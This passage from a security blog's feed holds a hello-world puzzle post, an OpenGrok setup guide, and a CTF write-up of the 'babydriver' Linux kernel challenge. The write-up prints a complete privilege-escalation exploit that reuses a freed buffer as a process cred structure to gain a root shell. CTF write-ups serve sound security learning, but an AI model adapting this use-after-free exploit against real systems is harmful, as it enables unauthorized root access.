<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:10]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line">test.c:3:8: warning: implicit declaration of <span class="keyword">function</span> <span class="string">'putchar'</span> is invalid <span class="keyword">in</span> C99</span><br><span class="line">      [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="keyword">if</span>(putchar(72)) &#123;&#125;</span><br><span class="line">       ^</span><br><span class="line">1 warning generated.</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:15]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>
<h4 id="0x03-level-3"><a href="#0x03-level-3" class="headerlink" title="0x03: level 3"></a>0x03: level 3</h4><p>主要是#符号的替代。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line">%:include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    if(putchar(72)) &#123;&#125;</span><br><span class="line">    if(putchar(101)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(111)) &#123;&#125;</span><br><span class="line">    if(putchar(32)) &#123;&#125;</span><br><span class="line">    if(putchar(119)) &#123;&#125;</span><br><span class="line">    if(putchar(114)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(100)) &#123;&#125;</span><br><span class="line">    if(putchar(10)) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:03]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:05]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>
<h4 id="0x04-level-4"><a href="#0x04-level-4" class="headerlink" title="0x04: level 4"></a>0x04: level 4</h4><p>这个好难想…shellcode行么我想说…<br>msfvenom直接生成一个…<br>那么问题来了，sc也要执行啊，咋规避括号，难道要手写一个PE/ELF文件么。</p>
<h4 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05: 结语"></a>0x05: 结语</h4><p>挺有意思的问题，这个东西仁者见仁，智者见智，知乎上见到太多方式了，毕竟putchar很丑陋，轮子哥那个代码还是挺好看的。至于level 4，有人提到了hack c，很可惜UB…</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;偶然在知乎上看到一个问题，特殊的方式输出hello world，后来知道这是cnss的招新题目，感觉还挺有意思的，做了下记录下来。&lt;/p&gt;
    
    </summary>
    
    
      <category term="C" scheme="http://o0xmuhe.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>babydriver writeup</title>
    <link href="http://o0xmuhe.me/2017/07/13/babydriver-writeup/"/>
    <id>http://o0xmuhe.me/2017/07/13/babydriver-writeup/</id>
    <published>2017-07-13T08:23:34.000Z</published>
    <updated>2017-08-20T08:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>之前国赛的一个Linux kernel pwn，Atum大佬的题目。</p>
<a id="more"></a>
<p>简单的来说就是kernel的UAF，怎么利用就仁者见仁，智者见智了。</p>
<ol>
<li><p>复杂一点，0ctf knote的思路，喷射tty_struct内核对象，然后利用write方法修改这个内核对象，完成提权，但是要bypass smtp保护，这个需要ROP。</p>
</li>
<li><p>赛后问了出题人，最简单的方法，直接fork，利用write方法改uid去拿root，代码也很短，不需要bypass 那些保护。</p>
</li>
</ol>
<p>方法1的话fp的wp写的很清楚(膜石总+林博士),方法2的话文章后面会放出出题人的exp。</p>
<h4 id="0x01-出题人的exp"><a href="#0x01-出题人的exp" class="headerlink" title="0x01: 出题人的exp"></a>0x01: 出题人的exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> credsize=<span class="number">168</span>;</span><br><span class="line"><span class="keyword">char</span> *dev=<span class="string">"/dev/babydev"</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> racestop=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> releasedone=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2,ret;</span><br><span class="line">    <span class="keyword">char</span> zero[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd1=open(dev,O_RDWR);</span><br><span class="line">    fd2=open(dev,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd1=%d\n fd2=%d\n"</span>,fd1,fd2);</span><br><span class="line">    ret=ioctl(fd1,<span class="number">0x10001</span>,credsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ioctl in main =%d\n"</span>,ret);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> pid=fork();</span><br><span class="line">    <span class="keyword">if</span>(pid&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error,pid&lt;0"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">        ret=write(fd2,zero,<span class="number">28</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"write in writebuf=%d\n"</span>,ret);</span><br><span class="line"></span><br><span class="line">        t=getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uid=%d\n"</span>,t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;之前国赛的一个Linux kernel pwn，Atum大佬的题目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://o0xmuhe.me/tags/ctf/"/>
    
      <category term="linux kernel" scheme="http://o0xmuhe.me/tags/linux-kernel/"/>
    
      <category term="ctf writeup" scheme="http://o0xmuhe.me/tags/ctf-writeup/"/>
    
  </entry>
  
  <entry>
    <title>OpenGrok搭建</title>
    <link href="http://o0xmuhe.me/2017/07/05/OpenGrok%E6%90%AD%E5%BB%BA/"/>
    <id>http://o0xmuhe.me/2017/07/05/OpenGrok搭建/</id>
    <published>2017-07-05T04:11:51.000Z</published>
    <updated>2017-07-05T04:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00: 起因"></a>0x00: 起因</h4><p>工作环境换到了mac之后很多东西都不一样了。最近在看Linux kernel几个漏洞，需要阅读Linux源码，然而在windows上使用习惯了source insight后，macOS上一脸懵逼，不知道啥工具好使。了解到OpenGrok之后，决定搭建一个，主要是添加源码方便，也方便实用，感觉还不错。</p>
<p>其实vim或者subl这类编辑器看源码也可以，只是我还没习惯。所以就先OpenGrok啦～</p>
<a id="more"></a>
<h4 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01: 准备工作"></a>0x01: 准备工作</h4><p>根据github上项目的wiki可知，需要的准备工作如下：</p>
<ul>
<li>JDK 1.8 or higher</li>
<li>{OpenGrok binaries from <a href="https://github.com/OpenGrok/OpenGrok/releases" target="_blank" rel="noopener">https://github.com/OpenGrok/OpenGrok/releases</a> (either the package for Solaris, or .tar.gz with binaries, NOT the src !)</li>
<li>Exuberant Ctags for analysis (<a href="https://github.com/universal-ctags" target="_blank" rel="noopener">https://github.com/universal-ctags</a> is recommended)</li>
<li>A servlet container like GlassFish or Tomcat (8.x or later) also running with java at least 1.8</li>
<li>If history is needed, appropriate binary (in some cases also cvs/svn repository) must be present on the system (e.g. Subversion or Mercurial or SCCS or … )</li>
<li>2GB of memory for indexing process using OpenGrok script (can use less, this is scaled for bigger deployments)</li>
<li>a recent browser for clients - IE, Firefox, recent Chrome or Safari<br>sufficient ULIMIT settings (refer to README)</li>
</ul>
<p>我在自己服务器上搭建的，系统是ubuntu，在安装了jdk8之后，去下载了tomcat和opengrok的包。<br>这里说个题外话，使用apt-get方式安装的tomcat8很奇怪，服务起来了，但是curl访问本地8080的时候，没回应，所以我最后去官网下载了一个tomcat的包。</p>
<h4 id="0x02：过程"><a href="#0x02：过程" class="headerlink" title="0x02：过程"></a>0x02：过程</h4><pre><code>如果是很多人用，推荐专门创建一个用户，做好权限的隔离，个人使用的话无所谓了。
</code></pre><h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><ul>
<li>找一个目录，把下载来的tomcat和opengrok解压了。</li>
<li>启动tomcat，然后访问<code>http://127.0.0.1:8080</code>，确定tomcat正常工作。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-64-163-ubuntu:~$ ./apache-tomcat-8.5.16/bin/startup.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>为项目创建目录，拿我自己的举例子：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path/to/your/opengrok_projects/prj1</span><br></pre></td></tr></table></figure>
<p>目录结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path/to/your/opengrok_projects/prj1</span><br><span class="line">                        |-----/prj2</span><br><span class="line">                        |-----/prj3</span><br></pre></td></tr></table></figure>
<h6 id="部署opengrok"><a href="#部署opengrok" class="headerlink" title="部署opengrok"></a>部署opengrok</h6><ul>
<li>部署</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPENGROK_TOMCAT_BASE=path/to/apache-tomcat path/to/opengrok/bin/OpenGrok deploy</span><br></pre></td></tr></table></figure>
<ul>
<li>创建索引</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPENGROK_VERBOSE=<span class="literal">true</span> OPENGROK_INSTANCE_BASE=./opengrok_data ./opengrok-1.1-rc5/bin/OpenGrok  index ./opengrok_projects</span><br></pre></td></tr></table></figure>
<p>创建索引时，会创建三个目录，一个data目录来存放索引信息，一个etc目录创建配置信息和一个log目录。</p>
<ul>
<li>修改配置文件</li>
</ul>
<p>在<code>path/to/apache-tomcat/webapps/source/WEB-INF</code>目录下的<code>web.xml</code>文件</p>
<p>把</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/var/opengrok/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read it's configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>中的<code>/var/opengrok/etc/configuration.xml</code><br>修改成对应的opengrok的<code>path/to/opengrok/data/etc/configuration.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read its configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/home/ubuntu/opengrok_data/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我这里是这个样子的。</p>
<ul>
<li>把源码放进project目录</li>
</ul>
<p>我这里放的是linux-3.18.1的源码。以后如果想更新的话，直接放进去，然后重新生成索引就好了。</p>
<h4 id="0x03-效果"><a href="#0x03-效果" class="headerlink" title="0x03:效果"></a>0x03:效果</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/opengrok_build/QQ20170705-123540%402x.png" alt=""></p>
<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04:参考"></a>0x04:参考</h4><p><a href="https://github.com/OpenGrok/OpenGrok/wiki/How-to-install-OpenGrok" target="_blank" rel="noopener">wiki</a></p>
<p><a href="https://github.com/crazygit/temp/blob/master/setup_opengrok.md" target="_blank" rel="noopener">OpenGrok安装使用指南</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00: 起因&quot;&gt;&lt;/a&gt;0x00: 起因&lt;/h4&gt;&lt;p&gt;工作环境换到了mac之后很多东西都不一样了。最近在看Linux kernel几个漏洞，需要阅读Linux源码，然而在windows上使用习惯了source insight后，macOS上一脸懵逼，不知道啥工具好使。了解到OpenGrok之后，决定搭建一个，主要是添加源码方便，也方便实用，感觉还不错。&lt;/p&gt;
&lt;p&gt;其实vim或者subl这类编辑器看源码也可以，只是我还没习惯。所以就先OpenGrok啦～&lt;/p&gt;
    
    </summary>
    
    
      <category term="环境配置" scheme="http://o0xmuhe.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
      <category term="工具" scheme="http://o0xmuhe.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
